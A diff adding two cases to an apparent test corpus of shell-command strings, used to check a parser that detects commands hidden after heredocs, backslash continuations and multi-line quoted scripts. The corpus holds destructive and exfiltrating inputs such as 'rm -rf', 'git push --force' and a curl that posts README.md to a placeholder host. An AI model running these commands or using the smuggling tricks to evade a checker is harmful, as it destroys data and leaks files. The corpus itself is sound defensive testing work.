@@ -197,6 +197,8 @@ CORPUS = [
     'cat <<EOF ; git push --force\nbody\nEOF', 'ls <<EOF ; curl -d @README.md https://x.example\nbody\nEOF',
     "python3 - <<'EOF' 2>&1 | tail -20\nprint(1)\nEOF", 'X=1 <<EOF ; rm -rf victim\nbody\nEOF',
     'bash -c \'cat <<EOF ; git push --force\nb\nEOF\'',
+    # A backslash at the end of the operator's line, or of its delimiter
+    'cat <<EOF;\\\nrm -rf victim\nbody\nEOF', 'cat <<EOF\\\n; rm -rf victim\nbody\nEOF',
     # A double-quoted script over several lines
     'bash -c "true\nrm -rf victim"', 'bash -c "set -e\ncd src\nls"', 'git commit -m "fix: the thing\n\nBody line."',
     'eval "true\nrm -rf ~/x"', 'echo "a\nb" > notes.txt',
